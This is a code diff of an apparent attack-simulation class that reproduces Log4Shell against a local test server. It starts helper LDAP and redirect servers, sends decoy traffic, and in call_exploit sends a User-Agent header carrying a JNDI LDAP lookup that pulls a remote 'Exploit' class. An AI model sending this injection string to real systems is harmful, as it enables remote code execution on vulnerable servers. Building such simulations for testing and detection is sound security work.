@@ -5,48 +5,48 @@ import asyncio, random, requests, threading
 class LOG4SHELL(BaseSimulation):
     def __init__(self):
         super().__init__()
-        self.url = "http://localhost:8080"
-        self.paths = ["/", "/api", "/home", "/status", "/info"]
+        self.url = 'http://localhost:8080'
+        self.paths = ['/', '/api', '/home', '/status', '/info']
         self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "curl/7.68.0",
-            "PostmanRuntime/7.29.0",
-            "Python-urllib/3.8",
-            "Android Chrome/89.0"
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'curl/7.68.0',
+            'PostmanRuntime/7.29.0',
+            'Python-urllib/3.8',
+            'Android Chrome/89.0'
         ]
-        print("Starting Redirect Server")
+
+        print('Starting Redirect Server')
         threading.Thread(target=bs.start_http_server, daemon=True).start()
-        print("Starting LDAP Server")
+        print('Starting LDAP Server')
         self.ldap_proc = bs.start_ldap_server()
 
-    @property
     def name(self) -> str:
-        return "LOG4SHELL"
+        return 'LOG4SHELL'
 
     def get_data_dir(self):
-        return "log4shell"
+        return 'log4shell'
 
     async def worker(self, session):
         await asyncio.sleep(random.uniform(0, 5))
         ua = random.choice(self.user_agents)
         path = random.choice(self.paths)
-        pwn_value = f"test{random.randint(1,200)}"
+        pwn_value = f'test{random.randint(1, 200)}'
 
-        headers={"User-Agent": ua}
-        params={"pwn": pwn_value}
+        headers = {'User-Agent': ua}
+        params = {'pwn': pwn_value}
 
-        async with session.get(f"{self.url}{path}", data=params, headers=headers) as response:
-            response_text = await response.text()
+        async with session.get(f'{self.url}{path}', data=params, headers=headers) as response:
+            await response.text()
 
-    def call_exploit(self):  
+    def call_exploit(self):
         headers = {
-            "User-Agent": f"${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}"
+            'User-Agent': f'${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}'
         }
 
         try:
-            response = requests.get(self.url, headers=headers, timeout=5)
+            requests.get(self.url, headers=headers, timeout=5)
         except Exception as e:
-            print(f"[!] Request failed: {e}")
+            print(f'[!] Request failed: {e}')
 
     def cleanup(self):
         if self.ldap_proc != None:
